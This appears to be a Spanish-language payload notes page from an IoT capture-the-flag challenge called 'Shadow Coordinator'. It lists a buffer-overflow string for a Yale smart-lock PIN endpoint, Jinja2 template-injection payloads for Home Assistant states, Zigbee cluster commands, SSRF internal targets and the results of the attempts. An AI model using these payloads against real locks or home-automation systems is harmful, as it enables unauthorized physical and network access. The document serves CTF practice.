# Payloads - Shadow Coordinator

## 🎯 Payloads y Wordlists

### 📝 Wordlists Especializadas
| Archivo | Descripción | Uso |
|---------|-------------|-----|
| `iot_wordlist.txt` | Wordlist IoT/OT específica | Fuzzing endpoints IoT |

### 🔧 Payloads de Explotación

#### Buffer Overflow - Yale YRD256
```python
# Smart Lock Buffer Overflow
payload = "A" * 1000  # Overflow en set_pin_code
endpoint = "/api/v2/services/lock/set_pin_code"
```

#### Template Injection - Jinja2
```jinja2
# Sistema de notificaciones
{{ states }}
{{ states | selectattr('entity_id', 'search', 'flag') }}
{% for entity in states %}{% if 'coordinator' in entity.entity_id %}{{ entity.state }}{% endif %}{% endfor %}
```

#### Cluster ZHA 257 Commands
```python
cluster_commands = [
    "get_flag",
    "get_coordinator_flag", 
    "shadow_coordinator_flag",
    "coordinator_unlock_flag",
    "coordinator_reveal_flag",
    "shadow_coordinator_unlock"
]
```

#### SSRF Payloads
```python
# Internal API targets
internal_targets = [
    "internal-api:8080",
    "localhost:8080", 
    "127.0.0.1:8080",
    "coordinator.internal:8080"
]
```

### 🎲 Token Generation Attempts

#### Frame 307 Based
```python
# Basado en Frame 307 (39 bytes)
frame_data = "00:15:8d:00:02:1a:2b:3c"
sequence = 51
capability = 0x8e
```

#### Mathematical Correlations  
```python
# Basado en temperaturas anómalas
temp_ratio = 0.38
temp_values = [-3.8, -4.1, -2.9]
hex_pattern = ['0x4', '0x3', '0x3', '0x4', '0x2']
```

#### IEEE Address Transformations
```python
# Transformaciones IEEE
ieee_base = "00158d00021a2b3c"
coordinator_ieee = "00124B0024AA1001"  
target_device = "0x7B9C"
```

## 📊 Estadísticas de Payloads

- **Token candidates probados:** 51+
- **Template injection attempts:** 20+
- **Buffer overflow confirmados:** 1
- **Cluster commands ejecutados:** 7
- **SSRF targets probados:** 15+

## 🎯 Resultados

### ✅ Payloads Exitosos
- **Buffer overflow Yale YRD256:** `authorized_no_pin = 1`
- **Cluster ZHA commands:** Encolados exitosamente
- **Template injection:** Ejecutado (sin flag extraction)

### ❌ Payloads Sin Éxito
- **Token generation:** Ningún token válido encontrado
- **SSRF bypass:** Security policy bloqueó intentos
- **Code execution:** Template injection limitado

---

*Payloads desarrollados durante análisis Shadow Coordinator - Mayo 2026*